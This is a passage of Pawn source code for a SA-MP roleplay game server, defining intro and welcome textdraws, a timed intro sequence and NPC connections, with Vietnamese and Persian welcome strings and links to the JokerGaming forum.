    IntroTD[27][playerid] = CreatePlayerTextDraw(playerid,-29.333160, 210.600036, "LD_BEAT:upr");
    PlayerTextDrawLetterSize(playerid,IntroTD[27][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[27][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[27][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[27][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[27][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[27][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[27][playerid], 4);

    IntroTD[28][playerid] = CreatePlayerTextDraw(playerid,-9.333160, 132.785202, "LD_BEAT:upr");
    PlayerTextDrawLetterSize(playerid,IntroTD[28][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[28][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[28][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[28][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[28][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[28][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[28][playerid], 4);

    IntroTD[29][playerid] = CreatePlayerTextDraw(playerid,186.666549, 26.570434, "LD_BEAT:downl");
    PlayerTextDrawLetterSize(playerid,IntroTD[29][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[29][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[29][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[29][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[29][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[29][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[29][playerid], 4);

    IntroTD[30][playerid] = CreatePlayerTextDraw(playerid,170.666549, 88.133399, "LD_BEAT:downl");
    PlayerTextDrawLetterSize(playerid,IntroTD[30][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[30][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[30][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[30][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[30][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[30][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[30][playerid], 4);

    IntroTD[31][playerid] = CreatePlayerTextDraw(playerid,153.666519, 151.770416, "LD_BEAT:downl");
    PlayerTextDrawLetterSize(playerid,IntroTD[31][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[31][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[31][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[31][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[31][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[31][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[31][playerid], 4);

    IntroTD[32][playerid] = CreatePlayerTextDraw(playerid,134.999832, 220.800018, "LD_BEAT:downl");
    PlayerTextDrawLetterSize(playerid,IntroTD[32][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[32][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[32][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[32][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[32][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[32][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[32][playerid], 4);

    IntroTD[33][playerid] = CreatePlayerTextDraw(playerid,115.999832, 293.977722, "LD_BEAT:downl");
    PlayerTextDrawLetterSize(playerid,IntroTD[33][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[33][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[33][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[33][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[33][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[33][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[33][playerid], 4);

    IntroTD[34][playerid] = CreatePlayerTextDraw(playerid,-31.333515, 155.185089, "LD_BEAT:downl");
    PlayerTextDrawLetterSize(playerid,IntroTD[34][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[34][playerid], 104.000000, 110.755554);
    PlayerTextDrawAlignment(playerid,IntroTD[34][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[34][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[34][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[34][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[34][playerid], 4);

    IntroTD[35][playerid] = CreatePlayerTextDraw(playerid,31.666669, 54.340732, "LD_SPAC:white");
    PlayerTextDrawLetterSize(playerid,IntroTD[35][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[35][playerid], 198.333328, 104.533325);
    PlayerTextDrawAlignment(playerid,IntroTD[35][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[35][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[35][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[35][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[35][playerid], 4);

    IntroTD[36][playerid] = CreatePlayerTextDraw(playerid,1.999992, 308.792816, "LD_SPAC:white");
    PlayerTextDrawLetterSize(playerid,IntroTD[36][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[36][playerid], 198.333328, 104.533325);
    PlayerTextDrawAlignment(playerid,IntroTD[36][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[36][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[36][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[36][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[36][playerid], 4);

    IntroTD[37][playerid] = CreatePlayerTextDraw(playerid,520.333435, 91.600044, "LD_SPAC:white");
    PlayerTextDrawLetterSize(playerid,IntroTD[37][playerid], 0.000000, 0.000000);
    PlayerTextDrawTextSize(playerid,IntroTD[37][playerid], 103.333328, 204.503707);
    PlayerTextDrawAlignment(playerid,IntroTD[37][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[37][playerid], 255);
    PlayerTextDrawSetShadow(playerid,IntroTD[37][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[37][playerid], 0);
    PlayerTextDrawFont(playerid,IntroTD[37][playerid], 4);

    IntroTD[38][playerid] = CreatePlayerTextDraw(playerid,407.333312, 304.474121, ".");
    PlayerTextDrawLetterSize(playerid,IntroTD[38][playerid], 15.757328, 0.927999);
    PlayerTextDrawAlignment(playerid,IntroTD[38][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[38][playerid], 1124073471);
    PlayerTextDrawSetShadow(playerid,IntroTD[38][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[38][playerid], 1);
    PlayerTextDrawBackgroundColor(playerid,IntroTD[38][playerid], 51);
    PlayerTextDrawFont(playerid,IntroTD[38][playerid], 1);
    PlayerTextDrawSetProportional(playerid,IntroTD[38][playerid], 1);

    IntroTD[39][playerid] = CreatePlayerTextDraw(playerid,406.999938, 357.740631, ".");
    PlayerTextDrawLetterSize(playerid,IntroTD[39][playerid], 15.757328, 0.927999);
    PlayerTextDrawAlignment(playerid,IntroTD[39][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[39][playerid], 1124073471);
    PlayerTextDrawSetShadow(playerid,IntroTD[39][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[39][playerid], 1);
    PlayerTextDrawBackgroundColor(playerid,IntroTD[39][playerid], 51);
    PlayerTextDrawFont(playerid,IntroTD[39][playerid], 1);
    PlayerTextDrawSetProportional(playerid,IntroTD[39][playerid], 1);

    IntroTD[40][playerid] = CreatePlayerTextDraw(playerid,402.666717, 316.918457, "Chao Mung Toi");
    PlayerTextDrawLetterSize(playerid,IntroTD[40][playerid], 0.449999, 1.600000);
    PlayerTextDrawAlignment(playerid,IntroTD[40][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[40][playerid], -1);
    PlayerTextDrawSetShadow(playerid,IntroTD[40][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[40][playerid], 1);
    PlayerTextDrawBackgroundColor(playerid,IntroTD[40][playerid], 51);
    PlayerTextDrawFont(playerid,IntroTD[40][playerid], 2);
    PlayerTextDrawSetProportional(playerid,IntroTD[40][playerid], 1);

    IntroTD[41][playerid] = CreatePlayerTextDraw(playerid,409.000030, 337.414733, "May Chu RolePlay");
    PlayerTextDrawLetterSize(playerid,IntroTD[41][playerid], 0.449999, 1.600000);
    PlayerTextDrawAlignment(playerid,IntroTD[41][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[41][playerid], -1);
    PlayerTextDrawSetShadow(playerid,IntroTD[41][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[41][playerid], 1);
    PlayerTextDrawBackgroundColor(playerid,IntroTD[41][playerid], 51);
    PlayerTextDrawFont(playerid,IntroTD[41][playerid], 2);
    PlayerTextDrawSetProportional(playerid,IntroTD[41][playerid], 1);

    IntroTD[42][playerid] = CreatePlayerTextDraw(playerid,513.333312, 423.866760, "ROLEPLAY VIET NAM 2015");
    PlayerTextDrawLetterSize(playerid,IntroTD[42][playerid], 0.449999, 1.600000);
    PlayerTextDrawAlignment(playerid,IntroTD[42][playerid], 1);
    PlayerTextDrawColor(playerid,IntroTD[42][playerid], -1);
    PlayerTextDrawSetShadow(playerid,IntroTD[42][playerid], 0);
    PlayerTextDrawSetOutline(playerid,IntroTD[42][playerid], 1);
    PlayerTextDrawBackgroundColor(playerid,IntroTD[42][playerid], 51);
    PlayerTextDrawFont(playerid,IntroTD[42][playerid], 2);
    PlayerTextDrawSetProportional(playerid,IntroTD[42][playerid], 1);
    return true;
}

forward ShowIntro(playerid);
public ShowIntro(playerid) {
    SetPVarInt(playerid, "Intro", GetPVarInt(playerid, "Intro") + 1);
    new iteration = GetPVarInt(playerid, "Intro");
    switch(iteration)
    {
        case 1: { PlayerTextDrawShow(playerid, IntroTD[38][playerid]); PlayerTextDrawShow(playerid,IntroTD[39][playerid]); SetTimerEx("ShowIntro", 1000, 0, "d", playerid); }
        case 2: { PlayerTextDrawShow(playerid, IntroTD[40][playerid]); SetTimerEx("ShowIntro", 1000, 0, "d", playerid); }
        case 3: { PlayerTextDrawShow(playerid, IntroTD[41][playerid]); SetTimerEx("ShowIntro", 1000, 0, "d", playerid); }
        case 4: { PlayerTextDrawShow(playerid, IntroTD[42][playerid]); SetTimerEx("ShowIntro", 1000, 0, "d", playerid); }
    }
    return 1;
}
main()
{
    print("-_-_-_-_-_-_-_-_-_-_-_-_-\nScripter: Amir\n-_-_-_-_--_-_-_-_-_-_-_-_-");
    ConnectNPC("test","bus");
    //for(new i=0;i<=MAX_PLAYERS;i++) Bio[i] = true;
	ConnectNPC("VahedRani-Ls","Bus2");
}
public OnGameModeInit()
{

wtd[0] = TextDrawCreate(170.800033, 123.546669, "box");
TextDrawLetterSize(wtd[0], 0.000000, 20.479993);
TextDrawTextSize(wtd[0], 464.000000, 0.000000);
TextDrawAlignment(wtd[0], 1);
TextDrawColor(wtd[0], -1);
TextDrawUseBox(wtd[0], 1);
TextDrawBoxColor(wtd[0], 1684300900);
TextDrawSetShadow(wtd[0], 0);
TextDrawSetOutline(wtd[0], 0);
TextDrawBackgroundColor(wtd[0], 336860180);
TextDrawFont(wtd[0], 1);
TextDrawSetProportional(wtd[0], 1);
TextDrawSetShadow(wtd[0], 0);

wtd[1] = TextDrawCreate(356.400085, 129.519927, "Khosh Amadid");
TextDrawLetterSize(wtd[1], 0.400000, 1.600000);
TextDrawAlignment(wtd[1], 3);
TextDrawColor(wtd[1], -1523963137);
TextDrawSetShadow(wtd[1], 0);
TextDrawSetOutline(wtd[1], 0);
TextDrawBackgroundColor(wtd[1], 255);
TextDrawFont(wtd[1], 1);
TextDrawSetProportional(wtd[1], 1);
TextDrawSetShadow(wtd[1], 0);

wtd[2] = TextDrawCreate(462.000061, 151.173309, "Lotfan Ghavanin Ra Dar Anjoman Motale'e Konid");
TextDrawLetterSize(wtd[2], 0.263199, 1.517866);
TextDrawAlignment(wtd[2], 3);
TextDrawColor(wtd[2], 16711935);
TextDrawSetShadow(wtd[2], 0);
TextDrawSetOutline(wtd[2], 0);
TextDrawBackgroundColor(wtd[2], 255);
TextDrawFont(wtd[2], 2);
TextDrawSetProportional(wtd[2], 1);
TextDrawSetShadow(wtd[2], 0);

wtd[3] = TextDrawCreate(414.799957, 187.013336, "Age Soali Dari Bezan /Helpme");
TextDrawLetterSize(wtd[3], 0.400000, 1.600000);
TextDrawAlignment(wtd[3], 3);
TextDrawColor(wtd[3], -2147483393);
TextDrawSetShadow(wtd[3], 0);
TextDrawSetOutline(wtd[3], 0);
TextDrawBackgroundColor(wtd[3], 255);
TextDrawFont(wtd[3], 1);
TextDrawSetProportional(wtd[3], 1);
TextDrawSetShadow(wtd[3], 0);

wtd[4] = TextDrawCreate(243.599990, 169.093231, "Forum.JokerGaming.ir");
TextDrawLetterSize(wtd[4], 0.400000, 1.600000);
TextDrawAlignment(wtd[4], 1);
TextDrawColor(wtd[4], -1378294017);
TextDrawSetShadow(wtd[4], 0);
TextDrawSetOutline(wtd[4], 0);
TextDrawBackgroundColor(wtd[4], 255);
TextDrawFont(wtd[4], 1);
TextDrawSetProportional(wtd[4], 1);
TextDrawSetShadow(wtd[4], 0);

wtd[5] = TextDrawCreate(419.599975, 207.920135, "Age Cheater Didi Bezan /Report");
TextDrawLetterSize(wtd[5], 0.400000, 1.600000);
TextDrawAlignment(wtd[5], 3);
TextDrawColor(wtd[5], -5963521);
TextDrawSetShadow(wtd[5], 0);
TextDrawSetOutline(wtd[5], 0);
TextDrawBackgroundColor(wtd[5], 255);
TextDrawFont(wtd[5], 1);
TextDrawSetProportional(wtd[5], 1);
TextDrawSetShadow(wtd[5], 0);

wtd[6] = TextDrawCreate(349.199981, 232.560043, "Telegram id");
TextDrawLetterSize(wtd[6], 0.400000, 1.600000);
TextDrawAlignment(wtd[6], 3);
TextDrawColor(wtd[6], 16777215);
TextDrawSetShadow(wtd[6], 0);
TextDrawSetOutline(wtd[6], 0);
TextDrawBackgroundColor(wtd[6], 255);
TextDrawFont(wtd[6], 1);
TextDrawSetProportional(wtd[6], 1);
TextDrawSetShadow(wtd[6], 0);

wtd[7] = TextDrawCreate(263.600067, 246.000015, "------------------~n~");
TextDrawLetterSize(wtd[7], 0.400000, 1.600000);
TextDrawAlignment(wtd[7], 1);
TextDrawColor(wtd[7], -16776961);
TextDrawSetShadow(wtd[7], 0);
TextDrawSetOutline(wtd[7], 0);
TextDrawBackgroundColor(wtd[7], 255);
TextDrawFont(wtd[7], 1);
TextDrawSetProportional(wtd[7], 1);
TextDrawSetShadow(wtd[7], 0);

wtd[8] = TextDrawCreate(262.800109, 269.893463, "------------------~n~");
TextDrawLetterSize(wtd[8], 0.400000, 1.600000);
TextDrawAlignment(wtd[8], 1);
TextDrawColor(wtd[8], -16776961);
TextDrawSetShadow(wtd[8], 0);
TextDrawSetOutline(wtd[8], 0);
TextDrawBackgroundColor(wtd[8], 255);
TextDrawFont(wtd[8], 1);
TextDrawSetProportional(wtd[8], 1);
TextDrawSetShadow(wtd[8], 0);

wtd[9] = TextDrawCreate(359.938659, 258.810058, "[at]JokerGaminG");
TextDrawLetterSize(wtd[9], 0.400000, 1.600000);
TextDrawAlignment(wtd[9], 3);
TextDrawColor(wtd[9], -1378294017);
TextDrawSetShadow(wtd[9], 0);
TextDrawSetOutline(wtd[9], 0);
TextDrawBackgroundColor(wtd[9], 255);
TextDrawFont(wtd[9], 1);
TextDrawSetProportional(wtd[9], 1);
TextDrawSetShadow(wtd[9], 0);

wtd[10] = TextDrawCreate(242.800170, 292.293457, "www.JokerGaminG.ir");
TextDrawLetterSize(wtd[10], 0.400000, 1.600000);
TextDrawAlignment(wtd[10], 1);
TextDrawColor(wtd[10], 8388863);
TextDrawSetShadow(wtd[10], 0);
TextDrawSetOutline(wtd[10], 0);
TextDrawBackgroundColor(wtd[10], 255);
TextDrawFont(wtd[10], 1);
TextDrawSetProportional(wtd[10], 1);
TextDrawSetShadow(wtd[10], 0);

atxd[0] = TextDrawCreate(184.400070, 1.839993, "box");
TextDrawLetterSize(atxd[0], 0.000000, 7.782992);
TextDrawTextSize(atxd[0], 462.000000, 0.000000);
TextDrawAlignment(atxd[0], 1);
TextDrawColor(atxd[0], -1);
TextDrawUseBox(atxd[0], 1);
TextDrawBoxColor(atxd[0], 336860280);
TextDrawSetShadow(atxd[0], 0);
TextDrawSetOutline(atxd[0], 0);
TextDrawBackgroundColor(atxd[0], 255);
TextDrawFont(atxd[0], 0);
TextDrawSetProportional(atxd[0], 1);
TextDrawSetShadow(atxd[0], 0);

atxd[1] = TextDrawCreate(231.000015, 20.506664, "Bans");
TextDrawLetterSize(atxd[1], 0.400000, 1.600000);
TextDrawAlignment(atxd[1], 1);
TextDrawColor(atxd[1], -1);
TextDrawSetShadow(atxd[1], 0);
TextDrawSetOutline(atxd[1], 0);
TextDrawBackgroundColor(atxd[1], 255);
TextDrawFont(atxd[1], 1);
TextDrawSetProportional(atxd[1], 1);
TextDrawSetShadow(atxd[1], 0);

atxd[2] = TextDrawCreate(230.200195, 3.333335, "Accounts");
TextDrawLetterSize(atxd[2], 0.400000, 1.600000);
TextDrawAlignment(atxd[2], 1);
TextDrawColor(atxd[2], -1);
TextDrawSetShadow(atxd[2], 0);
TextDrawSetOutline(atxd[2], 0);
TextDrawBackgroundColor(atxd[2], 255);
TextDrawFont(atxd[2], 1);
TextDrawSetProportional(atxd[2], 1);
TextDrawSetShadow(atxd[2], 0);

atxd[3] = TextDrawCreate(313.200103, 36.933311, "New account");
TextDrawLetterSize(atxd[3], 0.400000, 1.600000);
TextDrawAlignment(atxd[3], 3);
TextDrawColor(atxd[3], -1);
TextDrawSetShadow(atxd[3], 0);
TextDrawSetOutline(atxd[3], 0);
TextDrawBackgroundColor(atxd[3], 255);
TextDrawFont(atxd[3], 1);
TextDrawSetProportional(atxd[3], 1);
TextDrawSetShadow(atxd[3], 0);

atxd[4] = TextDrawCreate(359.600189, 53.360008, "Most players online");
TextDrawLetterSize(atxd[4], 0.400000, 1.600000);
TextDrawAlignment(atxd[4], 3);
TextDrawColor(atxd[4], -1);
TextDrawSetShadow(atxd[4], 0);
TextDrawSetOutline(atxd[4], 0);
TextDrawBackgroundColor(atxd[4], 255);
TextDrawFont(atxd[4], 1);
TextDrawSetProportional(atxd[4], 1);
TextDrawSetShadow(atxd[4], 0);

atxd[5] = TextDrawCreate(290.800079, 4.079965, "1");
TextDrawLetterSize(atxd[5], 0.400000, 1.600000);
TextDrawAlignment(atxd[5], 1);
TextDrawColor(atxd[5], -5963521);
TextDrawSetShadow(atxd[5], 0);
TextDrawSetOutline(atxd[5], 0);
TextDrawBackgroundColor(atxd[5], 255);
TextDrawFont(atxd[5], 1);
TextDrawSetProportional(atxd[5], 1);
TextDrawSetShadow(atxd[5], 0);

atxd[6] = TextDrawCreate(266.000152, 21.253343, "1");
TextDrawLetterSize(atxd[6], 0.400000, 1.600000);
TextDrawAlignment(atxd[6], 1);
TextDrawColor(atxd[6], -16776961);
TextDrawSetShadow(atxd[6], 0);
TextDrawSetOutline(atxd[6], 0);
TextDrawBackgroundColor(atxd[6], 255);
TextDrawFont(atxd[6], 1);
TextDrawSetProportional(atxd[6], 1);
TextDrawSetShadow(atxd[6], 0);

atxd[7] = TextDrawCreate(320.400054, 38.426685, "Arman");
TextDrawLetterSize(atxd[7], 0.400000, 1.600000);
TextDrawAlignment(atxd[7], 1);
TextDrawColor(atxd[7], 16711935);
TextDrawSetShadow(atxd[7], 0);
TextDrawSetOutline(atxd[7], 0);
TextDrawBackgroundColor(atxd[7], 255);
TextDrawFont(atxd[7], 1);
TextDrawSetProportional(atxd[7], 1);
TextDrawSetShadow(atxd[7], 0);

atxd[8] = TextDrawCreate(366.800048, 54.853336, "1");
TextDrawLetterSize(atxd[8], 0.400000, 1.600000);
TextDrawAlignment(atxd[8], 1);
TextDrawColor(atxd[8], 16777215);
TextDrawSetShadow(atxd[8], 0);
TextDrawSetOutline(atxd[8], 0);
TextDrawBackgroundColor(atxd[8], 255);
TextDrawFont(atxd[8], 1);
TextDrawSetProportional(atxd[8], 1);
TextDrawSetShadow(atxd[8], 0);


//-------------------------intro
    IntroText1[0] = TextDrawCreate(-1,0,"~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~"); TextDrawLetterSize(IntroText1[0],0.449999,5.499997); TextDrawAlignment(IntroText1[0],0); TextDrawBackgroundColor(IntroText1[0],0x000000FF); TextDrawFont(IntroText1[0],3); TextDrawUseBox(IntroText1[0],1); TextDrawBoxColor(IntroText1[0],0x000000FF); TextDrawTextSize(IntroText1[0],662.000000,10.000000); TextDrawSetOutline(IntroText1[0],0); TextDrawSetProportional(IntroText1[0],1); TextDrawSetShadow(IntroText1[0],1);
	IntroText1[1] = TextDrawCreate(309,207," JokerGaminG"); TextDrawLetterSize(IntroText1[1],0.550000,2.299999); TextDrawAlignment(IntroText1[1],2); TextDrawBackgroundColor(IntroText1[1],0x000000FF); TextDrawFont(IntroText1[1],1); TextDrawUseBox(IntroText1[1],0); TextDrawSetOutline(IntroText1[1],0); TextDrawSetProportional(IntroText1[1],1); TextDrawSetShadow(IntroText1[1],1);
	IntroText2[0] = TextDrawCreate(-1,0,"~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~"); TextDrawLetterSize(IntroText2[0],0.449999,5.499997); TextDrawAlignment(IntroText2[0],0); TextDrawBackgroundColor(IntroText2[0],0x000000FF); TextDrawFont(IntroText2[0],3); TextDrawUseBox(IntroText2[0],1); TextDrawBoxColor(IntroText2[0],0x000000FF); TextDrawTextSize(IntroText2[0],662.000000,10.000000); TextDrawSetOutline(IntroText2[0],0); TextDrawSetProportional(IntroText2[0],1); TextDrawSetShadow(IntroText2[0],1);
	IntroText2[1] = TextDrawCreate(307,207," JokerGaminG"); TextDrawLetterSize(IntroText2[1],0.550000,2.299999); TextDrawAlignment(IntroText2[1],2); TextDrawBackgroundColor(IntroText2[1],0x000000FF); TextDrawFont(IntroText2[1],1); TextDrawUseBox(IntroText2[1],0); TextDrawSetOutline(IntroText2[1],0); TextDrawSetProportional(IntroText2[1],1); TextDrawSetShadow(IntroText2[1],1);
    IntroText3[0] = TextDrawCreate(155,128,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText3[0],0.500000,4.599997); TextDrawAlignment(IntroText3[0],0); TextDrawBackgroundColor(IntroText3[0],0x000000FF); TextDrawFont(IntroText3[0],3); TextDrawUseBox(IntroText3[0],1); TextDrawBoxColor(IntroText3[0],0x000000FF); TextDrawTextSize(IntroText3[0],223.000000,138.000000); TextDrawSetOutline(IntroText3[0],0); TextDrawSetProportional(IntroText3[0],1); TextDrawSetShadow(IntroText3[0],1);
	IntroText3[1] = TextDrawCreate(216,135,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText3[1],0.500000,4.899997); TextDrawAlignment(IntroText3[1],0); TextDrawBackgroundColor(IntroText3[1],0x000000FF); TextDrawFont(IntroText3[1],3); TextDrawUseBox(IntroText3[1],1); TextDrawBoxColor(IntroText3[1],0x000000FF); TextDrawTextSize(IntroText3[1],284.000000,145.000000); TextDrawSetOutline(IntroText3[1],0); TextDrawSetProportional(IntroText3[1],1); TextDrawSetShadow(IntroText3[1],1);
	IntroText3[2] = TextDrawCreate(271,113,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText3[2],0.500000,4.899997); TextDrawAlignment(IntroText3[2],0); TextDrawBackgroundColor(IntroText3[2],0x000000FF); TextDrawFont(IntroText3[2],3); TextDrawUseBox(IntroText3[2],1); TextDrawBoxColor(IntroText3[2],0x000000FF); TextDrawTextSize(IntroText3[2],339.000000,123.000000); TextDrawSetOutline(IntroText3[2],0); TextDrawSetProportional(IntroText3[2],1); TextDrawSetShadow(IntroText3[2],1);
	IntroText3[3] = TextDrawCreate(319,108,"_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText3[3],0.500000,4.899997); TextDrawAlignment(IntroText3[3],0); TextDrawBackgroundColor(IntroText3[3],0x000000FF); TextDrawFont(IntroText3[3],3); TextDrawUseBox(IntroText3[3],1); TextDrawBoxColor(IntroText3[3],0x000000FF); TextDrawTextSize(IntroText3[3],387.000000,118.000000); TextDrawSetOutline(IntroText3[3],0); TextDrawSetProportional(IntroText3[3],1); TextDrawSetShadow(IntroText3[3],1);
	IntroText3[4] = TextDrawCreate(342,222,"~l~/"); TextDrawLetterSize(IntroText3[4],8.600014,1.000000); TextDrawAlignment(IntroText3[4],0); TextDrawBackgroundColor(IntroText3[4],0x000000FF); TextDrawFont(IntroText3[4],3); TextDrawUseBox(IntroText3[4],0); TextDrawSetOutline(IntroText3[4],0); TextDrawSetProportional(IntroText3[4],1); TextDrawSetShadow(IntroText3[4],0);
	IntroText3[5] = TextDrawCreate(332,220,"~l~/"); TextDrawLetterSize(IntroText3[5],8.600014,1.000000); TextDrawAlignment(IntroText3[5],0); TextDrawBackgroundColor(IntroText3[5],0x000000FF); TextDrawFont(IntroText3[5],3); TextDrawUseBox(IntroText3[5],0); TextDrawSetOutline(IntroText3[5],0); TextDrawSetProportional(IntroText3[5],1); TextDrawSetShadow(IntroText3[5],0);
	IntroText3[6] = TextDrawCreate(234,123,"~l~/"); TextDrawLetterSize(IntroText3[6],8.600014,1.000000); TextDrawAlignment(IntroText3[6],0); TextDrawBackgroundColor(IntroText3[6],0x000000FF); TextDrawFont(IntroText3[6],3); TextDrawUseBox(IntroText3[6],0); TextDrawSetOutline(IntroText3[6],0); TextDrawSetProportional(IntroText3[6],1); TextDrawSetShadow(IntroText3[6],0);
	IntroText3[7] = TextDrawCreate(224,128,"~l~/"); TextDrawLetterSize(IntroText3[7],8.600014,1.000000); TextDrawAlignment(IntroText3[7],0); TextDrawBackgroundColor(IntroText3[7],0x000000FF); TextDrawFont(IntroText3[7],3); TextDrawUseBox(IntroText3[7],0); TextDrawSetOutline(IntroText3[7],0); TextDrawSetProportional(IntroText3[7],1); TextDrawSetShadow(IntroText3[7],0);
	IntroText3[8] = TextDrawCreate(225,301,"~l~/"); TextDrawLetterSize(IntroText3[8],8.600014,1.000000); TextDrawAlignment(IntroText3[8],0); TextDrawBackgroundColor(IntroText3[8],0x000000FF); TextDrawFont(IntroText3[8],3); TextDrawUseBox(IntroText3[8],0); TextDrawSetOutline(IntroText3[8],0); TextDrawSetProportional(IntroText3[8],1); TextDrawSetShadow(IntroText3[8],0);
	IntroText3[9] = TextDrawCreate(213,299,"~l~/"); TextDrawLetterSize(IntroText3[9],8.600014,1.000000); TextDrawAlignment(IntroText3[9],0); TextDrawBackgroundColor(IntroText3[9],0x000000FF); TextDrawFont(IntroText3[9],3); TextDrawUseBox(IntroText3[9],0); TextDrawSetOutline(IntroText3[9],0); TextDrawSetProportional(IntroText3[9],1); TextDrawSetShadow(IntroText3[9],0);
	IntroText3[10] = TextDrawCreate(337,-52,"_~n~_~n~_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText3[10],0.650000,3.099999); TextDrawAlignment(IntroText3[10],0); TextDrawBackgroundColor(IntroText3[10],0x000000FF); TextDrawFont(IntroText3[10],3); TextDrawUseBox(IntroText3[10],1); TextDrawBoxColor(IntroText3[10],0x000000FF); TextDrawTextSize(IntroText3[10],395.000000,-42.000000); TextDrawSetOutline(IntroText3[10],0); TextDrawSetProportional(IntroText3[10],1); TextDrawSetShadow(IntroText3[10],1);
	IntroText3[11] = TextDrawCreate(344,231,"_~n~_~n~_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText3[11],0.550000,3.099999); TextDrawAlignment(IntroText3[11],0); TextDrawBackgroundColor(IntroText3[11],0x000000FF); TextDrawFont(IntroText3[11],3); TextDrawUseBox(IntroText3[11],1); TextDrawBoxColor(IntroText3[11],0x000000FF); TextDrawTextSize(IntroText3[11],396.000000,241.000000); TextDrawSetOutline(IntroText3[11],0); TextDrawSetProportional(IntroText3[11],1); TextDrawSetShadow(IntroText3[11],1);
	IntroText3[12] = TextDrawCreate(290,259,"_~n~_~n~_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText3[12],0.550000,3.099999); TextDrawAlignment(IntroText3[12],0); TextDrawBackgroundColor(IntroText3[12],0x000000FF); TextDrawFont(IntroText3[12],3); TextDrawUseBox(IntroText3[12],1); TextDrawBoxColor(IntroText3[12],0x000000FF); TextDrawTextSize(IntroText3[12],342.000000,269.000000); TextDrawSetOutline(IntroText3[12],0); TextDrawSetProportional(IntroText3[12],1); TextDrawSetShadow(IntroText3[12],1);
